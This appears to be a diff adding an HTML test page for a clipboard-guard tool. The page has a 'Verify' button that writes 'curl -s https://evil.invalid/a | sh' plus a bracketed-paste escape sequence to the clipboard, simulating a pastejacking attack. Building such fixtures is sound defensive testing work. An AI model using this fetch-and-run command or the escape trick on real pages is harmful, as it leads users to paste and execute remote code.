@@ -1,0 +1,7 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><title>Invisible characters and ESC</title>
+<script src="common.js"></script></head>
+<body><h1>Invisible characters and ESC</h1>
+<button id="go">Verify</button>
+<script>document.getElementById("go").addEventListener("click",()=>window.__clipguard.writeText("curl -s https://evil.invalid/a | sh\u001b[201~"));</script>
+</body></html>
